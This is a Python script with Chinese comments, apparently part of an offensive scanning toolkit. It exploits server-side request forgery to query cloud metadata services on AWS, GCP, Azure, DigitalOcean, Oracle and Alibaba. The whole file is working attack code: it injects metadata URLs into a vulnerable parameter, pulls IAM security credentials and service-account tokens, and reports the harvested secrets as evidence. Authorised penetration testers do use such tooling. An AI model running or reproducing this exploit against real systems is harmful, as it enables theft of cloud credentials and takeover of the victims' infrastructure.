"""cloud_metadata — 云元数据 SSRF 利用。

nuclei 检出 SSRF 后，自动探测云平台元数据端点窃取临时凭证。
支持: AWS / GCP / Azure / DigitalOcean / Oracle Cloud / Alibaba Cloud

用法:
  python cloud_metadata.py --url http://target/ssrf?url= --json
"""

import argparse
import json
import sys
import urllib.request
import urllib.error

TIMEOUT = 10

_METADATA_ENDPOINTS = [
    # AWS IMDSv1
    ("aws-imds", "http://169.254.169.254/latest/meta-data/", ["iam/security-credentials/", "public-keys/", "instance-id", "local-ipv4"]),
    # GCP
    ("gcp", "http://metadata.google.internal/computeMetadata/v1/", ["instance/service-accounts/default/token", "project/project-id"], {"Metadata-Flavor": "Google"}),
    # Azure
    ("azure", "http://169.254.169.254/metadata/instance/", ["compute?api-version=2021-02-01&format=text"], {"Metadata": "true"}),
    # DigitalOcean
    ("digitalocean", "http://169.254.169.254/metadata/v1/", ["id", "hostname", "interfaces/public/0/anchor_ipv4/address"]),
    # Oracle Cloud
    ("oracle", "http://169.254.169.254/opc/v2/", ["instance/", "vnics/"]),
    # Alibaba Cloud
    ("alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id", "ram/security-credentials/"]),
]


def _fetch(url: str, headers: dict | None = None) -> tuple[int, str]:
    try:
        req = urllib.request.Request(url)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        resp = urllib.request.urlopen(req, timeout=TIMEOUT)
        body = resp.read().decode("utf-8", errors="replace")[:2000]
        return resp.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")[:500]
    except Exception:
        return -1, ""


def _replace_placeholder(payload_url: str, meta_url: str) -> str:
    """注入 metadata URL 到 SSRF payload。常见占位符: {url}, {host}, INTERACTSH_URL"""
    url = payload_url.replace("{url}", meta_url).replace("{host}", meta_url.split("/")[2])
    # 如果 payload 已经是完整 URL 没有占位符，追加为参数
    if meta_url not in url and "{url}" not in payload_url:
        if "?" in payload_url:
            url = payload_url + "&ssrf_test=" + urllib.parse.quote(meta_url)
        else:
            url = payload_url + "?url=" + urllib.parse.quote(meta_url)
    return url


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="SSRF payload URL (含 {url} 占位符)")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    results = []
    for name, base_url, paths, *rest in _METADATA_ENDPOINTS:
        headers = rest[0] if rest else {}
        for path in paths:
            meta_url = base_url + path
            target = _replace_placeholder(args.url, meta_url)
            status, body = _fetch(target, headers)
            if status == 200 and len(body) > 10:
                results.append({
                    "type": "cloud_credential",
                    "provider": name,
                    "endpoint": meta_url,
                    "status": status,
                    "evidence": body[:500],
                    "severity": "critical",
                })

    if args.json:
        for r in results:
            print(json.dumps(r, ensure_ascii=False))
    else:
        print(f"[*] Checked {len(_METADATA_ENDPOINTS)} endpoints, {len(results)} hits")
    return 0


if __name__ == "__main__":
    main()
